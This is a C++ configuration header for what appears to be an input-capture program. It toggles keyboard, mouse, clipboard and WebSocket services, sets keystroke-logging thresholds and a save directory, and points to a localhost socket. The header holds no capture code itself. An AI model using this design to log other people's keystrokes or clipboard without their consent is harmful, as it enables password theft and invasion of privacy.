#pragma once

// ---
// Service toggle
// ---

#define SERVICE_KEYBOARD_ENABLED	true
#define SERVICE_MOUSE_ENABLED		false
#define SERVICE_CLIPBOARD_ENABLED	false
#define SERVICE_WEBSOCKET_ENABLED	true

// ---
// WebSocket settings
// ---

#if SERVICE_WEBSOCKET_ENABLED

// WebSocket server host
// #define WS_HOST "ws://localhost:8080/"
#define WS_HOST "ws://localhost:25565/"

// After how many seconds server retries to connect
// after fail
#define WS_CONNECTION_DELAY_SEC 1

#endif

// ---
// Keyboard settings
// ---

#if SERVICE_KEYBOARD_ENABLED

// Amount of keypresses of the same button
// after which keyboard stops logging it
#define KBD_MAX_REPEATS 5

// How many times key should be pressed to save data
#define KBD_KEYS_TO_SAVE 100

// Name of keyboard service working directory
#define KBD_DIR "kbd"

#endif

// ---
// Service includes
// ---

#if SERVICE_KEYBOARD_ENABLED
#include "keyboard.hpp"
#endif
#if SERVICE_MOUSE_ENABLED
#include "mouse.hpp"
#endif
#if SERVICE_CLIPBOARD_ENABLED
#include "clipboard.hpp"
#endif
#if SERVICE_WEBSOCKET_ENABLED
#include "websocket.hpp"
#endif

namespace Services
{
	static void RunAll()
	{
#if SERVICE_KEYBOARD_ENABLED
		Keyboard::Run();
#endif
#if SERVICE_MOUSE_ENABLED
		Mouse::Run();
#endif
#if SERVICE_CLIPBOARD_ENABLED
		Clipboard::Run();
#endif
#if SERVICE_WEBSOCKET_ENABLED
		WebSocket::Run();
#endif
	}

	static void StopAll()
	{
#if SERVICE_KEYBOARD_ENABLED
		Keyboard::Stop();
#endif
#if SERVICE_MOUSE_ENABLED
		Mouse::Stop();
#endif
#if SERVICE_CLIPBOARD_ENABLED
		Clipboard::Stop();
#endif
#if SERVICE_WEBSOCKET_ENABLED
		WebSocket::Stop();
#endif
	}
}